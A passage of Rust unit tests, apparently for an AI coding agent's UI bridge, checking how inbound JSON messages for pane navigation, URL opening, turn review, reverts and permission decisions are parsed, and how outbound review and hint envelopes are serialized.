    /// request ids are malformed too.
    #[test]
    fn an_unknown_missing_or_misspelled_pane_nav_direction_fails_to_parse() {
        for direction in ["sideways", "Left", "north", "", "h"] {
            let json = format!(r#"{{"type":"pane_nav","request_id":"r","direction":"{direction}"}}"#);
            assert!(parse_inbound_message(&json).is_none(), "{direction:?}");
        }
        assert!(parse_inbound_message(r#"{"type":"pane_nav","request_id":"r"}"#).is_none());
        assert!(parse_inbound_message(r#"{"type":"pane_nav","direction":"left"}"#).is_none());
        assert!(parse_inbound_message(r#"{"type":"pane_nav","request_id":"r","direction":null}"#).is_none());
    }

    /// `gx` opens a web link through window-level `open_url`, without a tab id. The request id and
    /// chosen address match the exact JSON string pinned by `agent-ui/web/src/bridge.test.ts`.
    #[test]
    fn parses_open_url_as_a_window_level_message() {
        let json = r#"{"type":"open_url","request_id":"req-1","url":"https://example.com/a"}"#;
        let msg = parse_inbound_message(json).unwrap();
        assert_eq!(msg.tab_ref(), TabRef::WindowLevel);
        assert_eq!(msg.request_id(), "req-1");
        match msg {
            InboundMessage::OpenUrl { request_id, url } => {
                assert_eq!(request_id, "req-1");
                assert_eq!(url, "https://example.com/a");
            }
            other => panic!("{other:?}"),
        }
    }

    /// A message with no address, a `null` one, a non-string one or no request id is malformed like any
    /// other: never "open nothing", and never an address some later `match` invents for it.
    #[test]
    fn an_open_url_with_no_url_or_request_id_fails_to_parse() {
        for bad in [
            r#"{"type":"open_url","request_id":"r"}"#,
            r#"{"type":"open_url","request_id":"r","url":null}"#,
            r#"{"type":"open_url","request_id":"r","url":5}"#,
            r#"{"type":"open_url","url":"https://example.com/"}"#,
        ] {
            assert!(parse_inbound_message(bad).is_none(), "{bad}");
        }
    }

    #[test]
    fn review_request_deserializes() {
        use crate::turn_review::{Scope, TurnRef};
        let parse = |json: &str| parse_inbound_message(json).unwrap_or_else(|| panic!("{json} did not parse"));
        for (turn_json, turn, scope_json, scope) in [
            (r#""latest""#, TurnRef::Latest, "turn", Scope::Turn),
            ("3", TurnRef::N(3), "session", Scope::Session),
            ("0", TurnRef::N(0), "turn", Scope::Turn),
        ] {
            let message = parse(&format!(
                r#"{{"type":"review_request","request_id":"r1","tab":3,"turn":{turn_json},"scope":"{scope_json}"}}"#
            ));
            assert_eq!(message.request_id(), "r1");
            assert!(matches!(message.tab_ref(), TabRef::Named(TabId(3))));
            let InboundMessage::ReviewRequest {
                turn: got_turn,
                scope: got_scope,
                ..
            } = message
            else {
                panic!("not a review_request")
            };
            assert_eq!(TurnRef::from(got_turn), turn);
            assert_eq!(Scope::from(got_scope), scope);
        }
    }

    #[test]
    fn a_review_request_with_an_unknown_turn_or_scope_fails_to_parse() {
        for bad in [
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":"newest","scope":"turn"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":-1,"scope":"turn"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":1.5,"scope":"turn"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":null,"scope":"turn"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":"latest","scope":"all"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"turn":"latest"}"#,
            r#"{"type":"review_request","request_id":"r","tab":1,"scope":"turn"}"#,
            r#"{"type":"review_diff_request","request_id":"r","tab":1,"turn":1,"path":"a"}"#,
            r#"{"type":"review_diff_request","request_id":"r","tab":1,"turn":"latest","scope":"turn","path":"a"}"#,
        ] {
            assert!(parse_inbound_message(bad).is_none(), "{bad}");
        }
    }

    #[test]
    fn review_diff_request_deserializes() {
        use crate::turn_review::Scope;
        let message = parse_inbound_message(
            r#"{"type":"review_diff_request","request_id":"r2","tab":3,"turn":7,"scope":"session","path":"core/src/x.rs"}"#,
        )
        .unwrap();
        assert_eq!(message.request_id(), "r2");
        assert!(matches!(message.tab_ref(), TabRef::Named(TabId(3))));
        let InboundMessage::ReviewDiffRequest { turn, scope, path, .. } = message else {
            panic!("not a review_diff_request")
        };
        assert_eq!(turn, 7);
        assert_eq!(Scope::from(scope), Scope::Session);
        assert_eq!(path, "core/src/x.rs");
    }

    /// Tab routing: a review of "the active tab" would show the wrong session's files after a switch.
    #[test]
    fn a_review_request_naming_no_tab_is_refused() {
        for json in [
            r#"{"type":"review_request","request_id":"a","turn":"latest","scope":"turn"}"#,
            r#"{"type":"review_request","request_id":"a","tab":null,"turn":"latest","scope":"turn"}"#,
            r#"{"type":"review_diff_request","request_id":"a","turn":1,"scope":"turn","path":"x"}"#,
        ] {
            let message = parse_inbound_message(json).unwrap();
            assert!(matches!(message.tab_ref(), TabRef::Missing), "{json}");
        }
    }

    /// Every revert, undo, comment and send message for turn review, as the panel sends it.
    const REVIEW_PHASE2_LINES: [&str; 9] = [
        r#"{"type":"review_revert","request_id":"r9","tab":3,"turn":7,"scope":"turn","path":"core/src/x.rs","target":{"hunk":2,"header":"@@ -830,6 +830,12 @@"}}"#,
        r#"{"type":"review_revert","request_id":"r9","tab":3,"turn":7,"scope":"turn","path":"core/src/x.rs","target":"file"}"#,
        r#"{"type":"review_undo","request_id":"r10","tab":3}"#,
        r#"{"type":"review_comment_add","request_id":"r11","tab":3,"turn":7,"scope":"turn","path":"core/src/x.rs","from":837,"to":842,"text":"Why by turn id?"}"#,
        r#"{"type":"review_comment_remove","request_id":"r12","tab":3,"id":1}"#,
        r#"{"type":"review_send","request_id":"r13","tab":3,"confirm":null}"#,
        r#"{"type":"review_send","request_id":"r14","tab":3,"confirm":"9f2c4e1a0b7d3c55"}"#,
        r#"{"type":"review_recover","request_id":"r15","entry":"<uuid>","answer":"restore"}"#,
        r#"{"type":"open_in_editor","request_id":"r16","tab":3,"turn":7,"scope":"turn","path":"core/src/x.rs","line":837}"#,
    ];

    #[test]
    fn review_phase2_messages_deserialize() {
        use crate::turn_review::Scope;
        let parsed: Vec<InboundMessage> = REVIEW_PHASE2_LINES
            .iter()
            .map(|line| parse_inbound_message(line).unwrap_or_else(|| panic!("{line}")))
            .collect();
        let InboundMessage::ReviewRevert {
            turn,
            scope,
            path,
            target,
            ..
        } = &parsed[0]
        else {
            panic!("{:?}", parsed[0])
        };
        assert_eq!(
            (*turn, Scope::from(*scope), path.as_str()),
            (7, Scope::Turn, "core/src/x.rs")
        );
        assert_eq!(
            *target,
            ReviewRevertTargetWire::Hunk {
                id: 2,
                header: "@@ -830,6 +830,12 @@".into()
            }
        );
        assert!(matches!(
            &parsed[1],
            InboundMessage::ReviewRevert {
                target: ReviewRevertTargetWire::File,
                ..
            }
        ));
        assert!(matches!(&parsed[2], InboundMessage::ReviewUndo { .. }));
        let InboundMessage::ReviewCommentAdd { from, to, text, .. } = &parsed[3] else {
            panic!("{:?}", parsed[3])
        };
        assert_eq!((*from, *to, text.as_str()), (837, 842, "Why by turn id?"));
        assert!(matches!(&parsed[4], InboundMessage::ReviewCommentRemove { id: 1, .. }));
        assert!(matches!(&parsed[5], InboundMessage::ReviewSend { confirm: None, .. }));
        let InboundMessage::ReviewSend { confirm, .. } = &parsed[6] else {
            panic!("{:?}", parsed[6])
        };
        assert_eq!(confirm.as_deref(), Some("9f2c4e1a0b7d3c55"));
        let InboundMessage::ReviewRecover { entry, answer, .. } = &parsed[7] else {
            panic!("{:?}", parsed[7])
        };
        assert_eq!((entry.as_str(), *answer), ("<uuid>", ReviewRecoverAnswerWire::Restore));
        let InboundMessage::OpenInEditor { line, path, .. } = &parsed[8] else {
            panic!("{:?}", parsed[8])
        };
        assert_eq!((*line, path.as_str()), (Some(837), "core/src/x.rs"));
        // An absent `confirm` and an absent `line` read as none; the other answer parses too.
        assert!(matches!(
            parse_inbound_message(r#"{"type":"review_send","request_id":"r","tab":3}"#),
            Some(InboundMessage::ReviewSend { confirm: None, .. })
        ));
        assert!(matches!(
            parse_inbound_message(
                r#"{"type":"open_in_editor","request_id":"r","tab":3,"turn":1,"scope":"session","path":"a"}"#
            ),
            Some(InboundMessage::OpenInEditor { line: None, .. })
        ));
        assert!(matches!(
            parse_inbound_message(r#"{"type":"review_recover","request_id":"r","entry":"e","answer":"dismiss"}"#),
            Some(InboundMessage::ReviewRecover {
                answer: ReviewRecoverAnswerWire::Dismiss,
                ..
            })
        ));
    }

    #[test]
    fn a_review_message_that_does_not_fit_fails_to_parse() {
        for bad in [
            r#"{"type":"review_revert","request_id":"r","tab":1,"turn":1,"scope":"turn","path":"a","target":"hunk"}"#,
            r#"{"type":"review_revert","request_id":"r","tab":1,"turn":1,"scope":"turn","path":"a","target":{"hunk":1}}"#,
            r#"{"type":"review_revert","request_id":"r","tab":1,"turn":1,"scope":"turn","path":"a"}"#,
            r#"{"type":"review_comment_add","request_id":"r","tab":1,"turn":1,"scope":"turn","path":"a","from":1,"text":"t"}"#,
            r#"{"type":"review_comment_remove","request_id":"r","tab":1}"#,
            r#"{"type":"review_comment_remove","request_id":"r","tab":1,"id":-1}"#,
            r#"{"type":"review_recover","request_id":"r","entry":"e","answer":"later"}"#,
            r#"{"type":"review_recover","request_id":"r","entry":"e"}"#,
        ] {
            assert!(parse_inbound_message(bad).is_none(), "{bad}");
        }
    }

    /// Tab routing: a revert, an undo, a comment or a send for "the active tab" would act on the
    /// wrong session after a switch. Only the recovery, which belongs to the project, is window-level.
    #[test]
    fn a_review_command_naming_no_tab_is_refused() {
        for line in REVIEW_PHASE2_LINES {
            let named = parse_inbound_message(line).unwrap();
            if matches!(named, InboundMessage::ReviewRecover { .. }) {
                assert!(matches!(named.tab_ref(), TabRef::WindowLevel), "{line}");
                continue;
            }
            assert!(matches!(named.tab_ref(), TabRef::Named(TabId(3))), "{line}");
            let dropped = if line.contains(r#""tab":3,"#) {
                line.replace(r#""tab":3,"#, "")
            } else {
                line.replace(r#","tab":3"#, "")
            };
            for without in [dropped, line.replace(r#""tab":3"#, r#""tab":null"#)] {
                assert_ne!(without, line, "the line names a tab: {line}");
                let message = parse_inbound_message(&without).unwrap_or_else(|| panic!("{without}"));
                assert!(matches!(message.tab_ref(), TabRef::Missing), "{without}");
            }
        }
    }

    #[test]
    fn request_ids_are_read_for_every_new_message() {
        let ids: Vec<String> = REVIEW_PHASE2_LINES
            .iter()
            .map(|line| parse_inbound_message(line).unwrap().request_id().to_owned())
            .collect();
        assert_eq!(ids, ["r9", "r9", "r10", "r11", "r12", "r13", "r14", "r15", "r16"]);
    }

    fn draft_with_everything() -> crate::turn_review::ReviewDraft {
        use crate::turn_review::{NewRevert, RevertShape, RevertSource, ReviewDraft};
        let mut draft = ReviewDraft::default();
        draft
            .add_comment(
                7,
                "core/src/x.rs",
                837,
                842,
                vec!["let base = …;".into()],
                "Why by turn id?",
            )
            .unwrap();
        let revert = |path: &str, hunk: Option<(u32, String)>, shape, source| NewRevert {
            turn: 7,
            path: path.into(),
            hunk,
            shape,
            source,
            at_line: 120,
            reverted_to: b"a\n".to_vec(),
            replaced: b"b\n".to_vec(),
            undo: None,
        };
        draft.record_revert(revert(
            "core/src/foo.rs",
            Some((2, "@@ -120,8 +120,12 @@".into())),
            RevertShape::Lines { from: 120, to: 127 },
            RevertSource::Panel,
        ));
        draft.record_revert(revert("new.rs", None, RevertShape::Deleted, RevertSource::Panel));
        draft.record_revert(revert("old.rs", None, RevertShape::Restored, RevertSource::Editor));
        let whole = draft.record_revert(revert("all.rs", None, RevertShape::WholeFile, RevertSource::Panel));
        draft.mark_undone(whole);
        draft
    }

    #[test]
    fn review_draft_send_preview_and_recovery_serialize_exactly() {
        use crate::turn_review::{compose, JournalEntry, RevertStatus};
        let v = |s: String| serde_json::from_str::<serde_json::Value>(&s).unwrap();
        let draft = draft_with_everything();
        let expected_draft = serde_json::json!({
            "comments": [{"id": 1, "turn": 7, "path": "core/src/x.rs", "from": 837, "to": 842,
                          "anchor": ["let base = …;"], "text": "Why by turn id?"}],
            "reverts": [
                {"id": 1, "turn": 7, "path": "core/src/foo.rs", "hunk": 2, "header": "@@ -120,8 +120,12 @@",
                 "what": "hunk", "lines": [120, 127], "source": "panel", "undone": false},
                {"id": 2, "turn": 7, "path": "new.rs", "hunk": null, "header": null,
                 "what": "deleted", "lines": null, "source": "panel", "undone": false},
                {"id": 3, "turn": 7, "path": "old.rs", "hunk": null, "header": null,
                 "what": "restored", "lines": null, "source": "editor", "undone": false},
                {"id": 4, "turn": 7, "path": "all.rs", "hunk": null, "header": null,
                 "what": "file", "lines": null, "source": "panel", "undone": true},
            ],
            "canUndo": true,
        });
        assert_eq!(
            v(serialize_review_draft_for_js(Some("r11"), TabId(3), &draft)),
            serde_json::json!({"kind": "review_draft", "requestId": "r11", "tab": 3, "draft": expected_draft})
        );
        assert_eq!(
            v(serialize_review_draft_for_js(None, TabId(3), &draft))["requestId"],
            serde_json::Value::Null,
            "a change the panel did not ask for carries no request id"
        );
        let empty = v(serialize_review_draft_for_js(
            None,
            TabId(3),
            &crate::turn_review::ReviewDraft::default(),
        ));
        assert_eq!(
            empty["draft"],
            serde_json::json!({"comments": [], "reverts": [], "canUndo": false})
        );

        let statuses = [
            (1, RevertStatus::OnDisk),
            (2, RevertStatus::ChangedSince),
            (3, RevertStatus::OnlyInEditor),
            (4, RevertStatus::Undone),
        ];
        let preview = compose(&draft, &statuses, 7);
        assert_eq!(
            v(serialize_review_send_preview_for_js(
                "r13",
                TabId(3),
                &draft,
                &preview,
                false
            )),
            serde_json::json!({
                "kind": "review_send_preview", "requestId": "r13", "tab": 3,
                "digest": preview.digest, "text": preview.text,
                "notOnDisk": [
                    {"id": 2, "path": "new.rs", "what": "deleted", "lines": null, "why": "changed since"},
                    {"id": 3, "path": "old.rs", "what": "restored", "lines": null,
                     "why": "only in the editor, not saved"},
                    {"id": 4, "path": "all.rs", "what": "file", "lines": null, "why": "undone"},
                ],
                "queued": false,
            })
        );
        assert_eq!(
            v(serialize_review_send_preview_for_js(
                "r13",
                TabId(3),
                &draft,
                &preview,
                true
            ))["queued"],
            true
        );

        let entry = JournalEntry {
            id: "e1".into(),
            path: "core/src/x.rs".into(),
            pre: None,
            intended: None,
            intended_mode: Some(0o644),
            mode: 0o644,
            at_ms: 1_790_000_000_000,
            pid: 1,
            session: "s".into(),
        };
        assert_eq!(
            v(serialize_review_recovery_for_js(&[entry])),
            serde_json::json!({"kind": "review_recovery", "entries": [
                {"id": "e1", "path": "core/src/x.rs", "at": 1_790_000_000_000u64}]})
        );
        assert_eq!(
            v(serialize_review_recovery_for_js(&[])),
            serde_json::json!({"kind": "review_recovery", "entries": []})
        );
    }

    /// `agent-ui/web/src/fixtures/review-send-preview.json`: a send preview leaving out one revert of
    /// every kind -- a hunk, a deleted file, a restored file and a whole file -- as this side sends it,
    /// which the overlay's tests render, so an entry without a line range is drawn by the page's own
    /// code and not only by a hand-written test value. Compared on every run;
    /// `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_review_send_preview_fixture_is_what_the_serializer_sends() {
        use crate::turn_review::{compose, RevertStatus};
        let draft = draft_with_everything();
        let statuses = [
            (1, RevertStatus::ChangedSince),
            (2, RevertStatus::ChangedSince),
            (3, RevertStatus::OnlyInEditor),
            (4, RevertStatus::Undone),
        ];
        let preview = compose(&draft, &statuses, 7);
        let envelope = serialize_review_send_preview_for_js("send-1", TabId(1), &draft, &preview, false);
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_review_send_preview_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "envelope": serde_json::from_str::<Value>(&envelope).unwrap(),
        });
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../agent-ui/web/src/fixtures/review-send-preview.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the review send preview fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed review send preview fixture is not what this test produces; if the change \
                 is intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    #[test]
    fn review_carries_the_draft_and_review_diff_its_file_kind() {
        use crate::turn_review::{Overview, ReviewDiff, Scope};
        let v = |s: String| serde_json::from_str::<serde_json::Value>(&s).unwrap();
        let overview = Overview {
            session: "s".into(),
            scope: Scope::Turn,
            current: 7,
            turns: Vec::new(),
            files: Vec::new(),
            compared: true,
            pending_no_result: 0,
            notes: Vec::new(),
        };
        let draft = draft_with_everything();
        let sent = v(serialize_review_for_js("r1", TabId(3), &overview, &draft));
        assert_eq!(
            sent["draft"],
            v(serialize_review_draft_for_js(None, TabId(3), &draft))["draft"]
        );

        for (binary, new_file, deleted_file) in [(true, false, false), (false, true, false), (false, false, true)] {
            let diff = ReviewDiff {
                turn: 7,
                path: "a".into(),
                added: 0,
                removed: 0,
                binary,
                new_file,
                deleted_file,
                mode_change: None,
                hunks: None,
            };
            let sent = v(serialize_review_diff_for_js("r2", TabId(3), &diff));
            assert_eq!(
                (
                    sent["binary"].as_bool(),
                    sent["newFile"].as_bool(),
                    sent["deletedFile"].as_bool()
                ),
                (Some(binary), Some(new_file), Some(deleted_file))
            );
        }
    }

    fn review_turn(n: u32, state_end: crate::turn_review::Snap) -> crate::turn_review::TurnRecord {
        use crate::turn_review::{Snap, TurnRecord};
        TurnRecord {
            n,
            turn_id: format!("t{n}"),
            tab: 3,
            session: "sess".into(),
            started_ms: 1_790_000_000_000,
            ended_ms: Some(1_790_000_020_000),
            base: Snap::Taken { commit: "b".into() },
            base_taken_ms: Some(1_790_000_000_100),
            end: state_end,
            late: false,
            overlapped_next: false,
            overlapped_tab: false,
            left_running: false,
            skipped_large: Vec::new(),
            left_out: Default::default(),
            earlier_run: false,
        }
    }

    #[test]
    fn review_envelopes_serialize_exactly() {
        use crate::turn_review::{
            DiffLine, Hunk, LineKind, Origin, Overview, OverviewFile, ReviewDiff, ReviewHint, Scope, Snap,
        };
        let v = |s: String| serde_json::from_str::<serde_json::Value>(&s).unwrap();
        let mut unfinished = review_turn(8, Snap::Unavailable("it never ended".into()));
        unfinished.ended_ms = None;
        unfinished.late = true;
        unfinished.overlapped_next = true;
        unfinished.overlapped_tab = true;
        let overview = Overview {
            session: "sess".into(),
            scope: Scope::Turn,
            current: 7,
            turns: vec![review_turn(7, Snap::Taken { commit: "e".into() }), unfinished],
            files: vec![
                OverviewFile {
                    path: "core/src/x.rs".into(),
                    added: 41,
                    removed: 6,
                    origin: Origin::Agent,
                    binary: false,
                    too_large: false,
                    nested: false,
                },
                OverviewFile {
                    path: "a.png".into(),
                    added: 0,
                    removed: 0,
                    origin: Origin::AgentOnly,
                    binary: true,
                    too_large: true,
                    nested: true,
                },
                OverviewFile {
                    path: "Cargo.lock".into(),
                    added: 2,
                    removed: 1,
                    origin: Origin::Workspace,
                    binary: false,
                    too_large: false,
                    nested: false,
                },
            ],
            compared: true,
            pending_no_result: 2,
            notes: vec!["changed on disk during this turn".into()],
        };
        assert_eq!(
            v(serialize_review_for_js(
                "r1",
                TabId(3),
                &overview,
                &crate::turn_review::ReviewDraft::default()
            )),
            serde_json::json!({
                "kind": "review", "requestId": "r1", "tab": 3, "scope": "turn", "current": 7,
                "turns": [
                    {"n": 7, "turnId": "t7", "startedAt": 1_790_000_000_000u64, "endedAt": 1_790_000_020_000u64,
                     "state": "ok", "late": false, "overlappedNext": false, "overlappedTab": false, "reason": null},
                    {"n": 8, "turnId": "t8", "startedAt": 1_790_000_000_000u64, "endedAt": null,
                     "state": "unfinished", "late": true, "overlappedNext": true, "overlappedTab": true,
                     "reason": "it never ended"},
                ],
                "files": [
                    {"path": "core/src/x.rs", "added": 41, "removed": 6, "origin": "agent", "binary": false,
                     "tooLarge": false, "nested": false},
                    {"path": "a.png", "added": 0, "removed": 0, "origin": "agent_only", "binary": true,
                     "tooLarge": true, "nested": true},
                    {"path": "Cargo.lock", "added": 2, "removed": 1, "origin": "workspace", "binary": false,
                     "tooLarge": false, "nested": false},
                ],
                "compared": true,
                "pendingNoResult": 2,
                "notes": ["changed on disk during this turn"],
                "draft": {"comments": [], "reverts": [], "canUndo": false},
            })
        );

        let diff = ReviewDiff {
            turn: 7,
            path: "core/src/x.rs".into(),
            added: 41,
            removed: 6,
            binary: false,
            new_file: false,
            deleted_file: false,
            mode_change: None,
            hunks: Some(vec![Hunk {
                id: 0,
                header: "@@ -830,6 +830,12 @@".into(),
                old_start: 830,
                old_len: 6,
                new_start: 830,
                new_len: 12,
                lines: vec![
                    DiffLine {
                        kind: LineKind::Context,
                        text: "keep".into(),
                        old_no: Some(830),
                        new_no: Some(830),
                    },
                    DiffLine {
                        kind: LineKind::Removed,
                        text: "old".into(),
                        old_no: Some(831),
                        new_no: None,
                    },
                    DiffLine {
                        kind: LineKind::Added,
                        text: "new".into(),
                        old_no: None,
                        new_no: Some(837),
                    },
                    DiffLine {
                        kind: LineKind::NoNewline,
                        text: "\\ No newline at end of file".into(),
                        old_no: None,
                        new_no: None,
                    },
                ],
            }]),
        };
        assert_eq!(
            v(serialize_review_diff_for_js("r2", TabId(3), &diff)),
            serde_json::json!({
                "kind": "review_diff", "requestId": "r2", "tab": 3, "turn": 7, "path": "core/src/x.rs",
                "added": 41, "removed": 6, "binary": false, "newFile": false, "deletedFile": false,
                "hunks": [{"id": 0, "header": "@@ -830,6 +830,12 @@", "lines": [
                    {"kind": "context", "text": "keep", "oldNo": 830, "newNo": 830},
                    {"kind": "removed", "text": "old", "oldNo": 831, "newNo": null},
                    {"kind": "added", "text": "new", "oldNo": null, "newNo": 837},
                    {"kind": "no_newline", "text": "\\ No newline at end of file", "oldNo": null, "newNo": null},
                ]}],
            })
        );

        assert_eq!(
            v(serialize_review_hint_for_js(&ReviewHint {
                tab: 3,
                turn: 7,
                files: 3
            })),
            serde_json::json!({ "kind": "review_hint", "tab": 3, "turn": 7, "files": 3 })
        );
        assert_eq!(
            v(serialize_review_hint_for_js(&ReviewHint {
                tab: 3,
                turn: 7,
                files: 0
            }))["files"],
            0,
            "zero clears the hint"
        );
    }

    #[test]
    fn hunks_null_over_the_cap() {
        let diff = crate::turn_review::ReviewDiff {
            turn: 2,
            path: "big.rs".into(),
            added: 1500,
            removed: 900,
            binary: false,
            new_file: false,
            deleted_file: false,
            mode_change: None,
            hunks: None,
        };
        let value: serde_json::Value =
            serde_json::from_str(&serialize_review_diff_for_js("r", TabId(1), &diff)).unwrap();
        assert!(value["hunks"].is_null(), "refused, not cut");
        assert!(value.as_object().unwrap().contains_key("hunks"), "the key stays");
        assert_eq!(value["added"], 1500);
        assert_eq!(value["removed"], 900);
    }

    #[test]
    fn serializes_the_five_hint_envelopes() {
        let v = |s: String| serde_json::from_str::<serde_json::Value>(&s).unwrap();
        assert_eq!(
            v(serialize_hint_collect_for_js(7)),
            serde_json::json!({ "kind": "hint_collect", "sessionId": 7 })
        );
        assert_eq!(
            v(serialize_hint_show_for_js(7, &["a".into(), "s".into()])),
            serde_json::json!({ "kind": "hint_show", "sessionId": 7, "labels": ["a", "s"] })
        );
        assert_eq!(
            v(serialize_hint_prefix_for_js(7, "a")),
            serde_json::json!({ "kind": "hint_prefix", "sessionId": 7, "typed": "a" })
        );
        assert_eq!(
            v(serialize_hint_land_for_js(7, 2)),
            serde_json::json!({ "kind": "hint_land", "sessionId": 7, "index": 2 })
        );
        assert_eq!(
            v(serialize_hint_end_for_js(7)),
            serde_json::json!({ "kind": "hint_end", "sessionId": 7 })
        );
    }

    #[test]
    fn parses_the_two_hint_messages() {
        let m = parse_inbound_message(r#"{"type":"hint_request","request_id":"r1"}"#).unwrap();
        assert_eq!(m.request_id(), "r1");
        assert!(matches!(m, InboundMessage::HintRequest { .. }));
        let m = parse_inbound_message(r#"{"type":"hint_targets","request_id":"r2","session_id":7,"count":3}"#).unwrap();
        assert!(matches!(
            m,
            InboundMessage::HintTargets {
                session_id: 7,
                count: 3,
                ..
            }
        ));
    }

    #[test]
    fn parses_ready_with_request_id() {
        let msg = parse_inbound_message(r#"{"type":"ready","request_id":"r1"}"#).unwrap();
        // .request_id() (a &self borrow) is checked before the by-value `matches!` pattern below,
        // which binds `request_id: String` out of `msg` by value (InboundMessage isn't Copy) --
        // reversing this order would partial-move `msg` and fail to borrow-check on the next line.
        assert_eq!(msg.request_id(), "r1");
        assert!(matches!(msg, InboundMessage::Ready { request_id } if request_id == "r1"));
    }

    #[test]
    fn parses_send_message() {
        let msg = parse_inbound_message(r#"{"type":"send_message","request_id":"r3","text":"hello"}"#).unwrap();
        match msg {
            InboundMessage::SendMessage { text, .. } => assert_eq!(text, "hello"),
            other => panic!("expected SendMessage, got {other:?}"),
        }
    }

    #[test]
    fn parses_interrupt() {
        let msg = parse_inbound_message(r#"{"type":"interrupt","request_id":"r4"}"#).unwrap();
        assert!(matches!(msg, InboundMessage::Interrupt { .. }));
    }

    #[test]
    fn parses_an_approval_which_carries_no_reason() {
        let msg = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r5","permission_id":"p1","decision":"allow"}"#,
        )
        .unwrap();
        match msg {
            InboundMessage::PermissionResponse {
                permission_id,
                decision,
                reason,
                ..
            } => {
                assert_eq!(permission_id, "p1");
                assert_eq!(decision, DecisionChoice::Allow);
                assert_eq!(decision.into_decision(reason), agent::PermissionDecision::Allow);
            }
            other => panic!("expected PermissionResponse, got {other:?}"),
        }
    }

    #[test]
    fn parses_a_denial_and_carries_its_reason_to_the_model() {
        let msg = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r5","permission_id":"p1","decision":"deny","reason":"not in this repo"}"#,
        )
        .unwrap();
        match msg {
            InboundMessage::PermissionResponse { decision, reason, .. } => {
                assert_eq!(
                    decision.into_decision(reason),
                    agent::PermissionDecision::Deny {
                        reason: Some("not in this repo".into())
                    }
                );
            }
            other => panic!("expected PermissionResponse, got {other:?}"),
        }
    }

    /// An empty reason box is not a reason. Sending the model "" as its explanation is worse than
    /// sending it nothing, because nothing at least reads as "no reason given".
    #[test]
    fn a_blank_deny_reason_becomes_no_reason_at_all() {
        let msg = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r5","permission_id":"p1","decision":"deny","reason":"   "}"#,
        )
        .unwrap();
        match msg {
            InboundMessage::PermissionResponse { decision, reason, .. } => {
                assert_eq!(
                    decision.into_decision(reason),
                    agent::PermissionDecision::Deny { reason: None }
                );
            }
            other => panic!("expected PermissionResponse, got {other:?}"),
        }
    }

    /// The failure direction that matters: a decision this build does not recognize must be
    /// REJECTED, never defaulted. A `bool allow` field could not express this -- any unknown value
    /// would have had to become one of the two, and the tempting default is the one that runs the
    /// tool.
    #[test]
    fn an_unrecognized_decision_is_rejected_rather_than_defaulted() {
        assert!(parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r5","permission_id":"p1","decision":"allow_for_session"}"#
        )
        .is_none());
        assert!(
            parse_inbound_message(
                r#"{"type":"permission_response","request_id":"r5","permission_id":"p1","allow":true}"#
            )
            .is_none(),
            "the old bool shape must not still be accepted"
        );
    }

    #[test]
    fn unparseable_json_returns_none_not_a_panic() {
        assert!(parse_inbound_message("not json at all {{{").is_none());
    }

    #[test]
    fn unrecognized_type_returns_none_not_a_panic() {
        assert!(parse_inbound_message(r#"{"type":"some_future_message_type","request_id":"r6"}"#).is_none());
    }

    #[test]
    fn missing_request_id_returns_none_not_a_panic() {
        assert!(parse_inbound_message(r#"{"type":"ready"}"#).is_none());
    }

    #[test]
    fn serialize_command_result_ok() {
        let json_str = serialize_command_result_for_js("r1", Ok(()));
        let parsed: Value = serde_json::from_str(&json_str).unwrap();
        assert_eq!(parsed["kind"], "command_result");
        assert_eq!(parsed["requestId"], "r1");
        assert_eq!(parsed["ok"], true);
    }

    #[test]
    fn serialize_command_result_error() {
        let json_str = serialize_command_result_for_js("r1", Err("boom"));
        let parsed: Value = serde_json::from_str(&json_str).unwrap();
        assert_eq!(parsed["ok"], false);
        assert_eq!(parsed["error"], "boom");
    }

    #[test]
    fn serialize_events_for_js_carries_revision_range_and_tagged_events() {
        let events = vec![AgentDomainEvent::PermissionResolved {
            permission_id: "p1".into(),
            outcome: PermissionOutcome::Allowed,
        }];
        let json_str = serialize_events_for_js(TabId(1), 3, 4, &events);
        let parsed: Value = serde_json::from_str(&json_str).unwrap();
        assert_eq!(parsed["kind"], "events");
        assert_eq!(parsed["tab"], 1);
        assert_eq!(parsed["fromRevision"], 3);
        assert_eq!(parsed["throughRevision"], 4);
        assert_eq!(parsed["events"][0]["type"], "permission_resolved");
        assert_eq!(parsed["events"][0]["permission_id"], "p1");
    }

    #[test]
    fn serialize_events_preserves_optional_fold_revisions_and_untagged_bytes() {
        let events = vec![AgentDomainEvent::TurnStarted { turn_id: "t1".into() }];
        let notes = CallNotes::default();
        let plain = serialize_events_for_js(TabId(1), 3, 5, &events);
        assert_eq!(
            plain,
            serialize_events_with_notes_for_js(TabId(1), 3, 5, &events, &notes)
        );
        assert_eq!(
            plain,
            serialize_events_with_notes_and_revisions_for_js(TabId(1), 3, 5, &events, &notes, None)
        );
        let mut expected: Value = serde_json::from_str(&plain).unwrap();
        assert!(expected.get("revisions").is_none());
        expected["revisions"] = json!([5]);
        let tagged = serialize_events_with_notes_and_revisions_for_js(TabId(1), 3, 5, &events, &notes, Some(&[5]));
        assert_eq!(serde_json::from_str::<Value>(&tagged).unwrap(), expected);
    }

    #[test]
    fn serialize_error_for_js_wraps_in_kind_error_envelope() {
        let json_str = serialize_error_for_js(TabId(1), "failed to start session: no such file or directory");
        let parsed: Value = serde_json::from_str(&json_str).unwrap();
        assert_eq!(parsed["kind"], "error");
        assert_eq!(parsed["tab"], 1);
